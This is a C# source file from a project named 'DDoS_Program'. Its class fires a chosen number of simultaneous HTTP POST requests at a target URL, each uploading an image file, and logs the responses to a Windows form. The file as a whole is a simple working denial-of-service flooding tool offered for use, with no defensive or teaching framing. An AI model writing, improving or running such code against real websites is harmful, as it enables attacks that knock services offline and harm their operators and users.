using Microsoft.VisualBasic.ApplicationServices;
using System;
using System.Collections.Generic;
using System.Diagnostics.Eventing.Reader;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DDoS_Program
{
    public class Logik
    {
        public Form1 Form { get; set; }

        static readonly HttpClient client = new HttpClient();

        public async void Execute(string url, int numberOfRequest)
        {

            Task[] tasks = new Task[numberOfRequest];

            for (int i = 0; i < numberOfRequest; i++)
            {

                tasks[i] = SendRequest(url, i);
            }

            await Task.WhenAll(tasks);
        }
        private async Task SendRequest(string url, int numberOfRequest)
        {
            string imagePath = "Write here the path to your image"; // Path to your image.
            try
            {
                using (var client = new HttpClient())
                using (var formData = new MultipartFormDataContent())
                {
                    // Load the image into a stream.
                    using (var fs = File.OpenRead(imagePath))
                    using (var streamContent = new StreamContent(fs))
                    {
                        formData.Add(streamContent, "file", "image.png"); // Specifies the file format of the image

                        // Send the request with the image data.
                        HttpResponseMessage response = await client.PostAsync(url, formData);

                        response.EnsureSuccessStatusCode();

                        string responseBody = await response.Content.ReadAsStringAsync();
                        string output = $"Request {numberOfRequest + 1}: Received response {response.StatusCode}\r\n";

                        Form.SuccessfulOutPut(output);
                    }


                }
            }
            catch (HttpRequestException e)
            {
                string output = $"\nException Caught! \r\n Type: {e.GetType()} | Message: {e.Message}";
                Form.FailOutPut(output);
            }
        }
    }
}
